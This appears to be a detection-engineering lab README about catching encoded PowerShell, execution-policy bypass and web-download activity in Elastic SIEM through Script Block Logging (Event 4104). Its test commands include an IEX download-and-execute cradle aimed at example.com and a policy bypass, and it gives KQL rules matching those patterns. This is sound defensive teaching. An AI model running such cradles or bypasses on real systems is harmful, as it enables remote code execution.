# SIEM Lab Notes

## Overview
Hands-on SIEM and detection engineering lab using Elastic Stack.  
This lab focuses on detecting suspicious Windows and PowerShell activity using real telemetry and custom detection queries.

---

## Lab Environment

- VMware Workstation
- Windows Server 2025 (Domain Controller)
- Windows 11 endpoint
- Ubuntu (Elastic Stack host)

Logs from Windows systems are ingested into Elastic SIEM for analysis and detection building.

---

## PowerShell Detection Labs

---

### 🔹 Encoded PowerShell Command Detection

Test Command:
```powershell
powershell -enc SQBFAFgAIAAiAFQARQBTAFQAIgA=
```

Observed Behavior:
- Command was base64 encoded but decoded and executed as:

```powershell
IEX "TEST"
```

Detection:
- Event ID: 4104 (Script Block Logging)
- Field used:

```text
powershell.file.script_block_text
```

Example Result:
```text
Creating Scriptblock text (1 of 1):
IEX "TEST"
```

---

### 🔹 Execution Policy Bypass Detection

Test Command:
```powershell
IEX "Set-ExecutionPolicy Bypass -Scope Process -Force"
```

Observed Behavior:
- Command logged successfully in Script Block Logging (4104)

Detection Queries:

Broad search:
```kql
event.dataset: "windows.powershell_operational"
and event.code: 4104
```

Refined detection:
```kql
event.dataset: "windows.powershell_operational"
and event.code: 4104
and powershell.file.script_block_text: *ExecutionPolicy*
```

---

### 🔹 PowerShell Download Detection (Web Requests)

Test Commands:
```powershell
Invoke-WebRequest http://example.com
```

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://example.com")
```

Observed Behavior:
- PowerShell initiated outbound web requests
- Remote content was retrieved and/or executed in memory
- Script Block Logging (4104) captured the full command

Example Log:
```text
Invoke-WebRequest http://example.com
```

or

```text
IEX (New-Object Net.WebClient).DownloadString("https://example.com")
```

---

### Detection Rule (Elastic)

```kql
event.code: "4104" AND powershell.file.script_block_text: ("*DownloadString*" OR "*Invoke-WebRequest*")
```

Rule Configuration:
- Name: download detection  
- Severity: Medium  
- Risk Score: 50  
- Interval: 1 minute  
- Lookback: 5 minutes  

---

### ✅ Validation

- Detection rule triggered successfully after executing test commands
- Alert contained:
  - correct host (`desktopwin11`)
  - correct user (`User1`)
  - correct script content

Example Alert Context:
```text
Invoke-WebRequest http://example.com
```

---

## Key Concepts Learned

### 🔹 Script Block Logging (Event ID 4104)

- Logs **actual PowerShell code executed**
- Captures commands **after parsing and decoding**
- Provides visibility into:
  - encoded commands
  - obfuscated scripts
  - dynamically generated code

---

### 🔹 Command Line vs Execution Visibility

| Log Type | Purpose |
|--------|--------|
| Event 4688 | Shows how PowerShell was launched (e.g. `-EncodedCommand`) |
| Event 4104 | Shows what actually executed ✅ |

---

### 🔹 Obfuscation Insight

- Base64 encoding hides commands from humans and simple detections
- Script Block Logging reveals decoded content
- Effective detections rely on **behavior, not raw input**

---

## Detection Strategy Notes

- Start with broad queries (`event.code: 4104`) before refining
- Validate detection logic using actual log data
- Focus on behavioral patterns rather than exact commands
- Avoid overly specific detections (e.g. matching only `whoami`)
- Combine multiple detection layers when possible

---

## Key Learnings

- PowerShell Script Block Logging (4104) is critical for detecting obfuscated activity  
- Encoded commands (`-enc`) are logged in decoded form  
- Detection rules should focus on **patterns of behavior**  
- Real detections may generate multiple alerts for a single action  
- Tuning is required to balance signal vs noise  
- Correlating multiple log sources improves detection accuracy  

---

## Next Steps

- Detect encoded PowerShell using command-line logs (Event ID 4688)
- Correlate command-line execution with script block logging
- Expand detection coverage for additional attack techniques
- Continue refining rules to reduce false positives
``
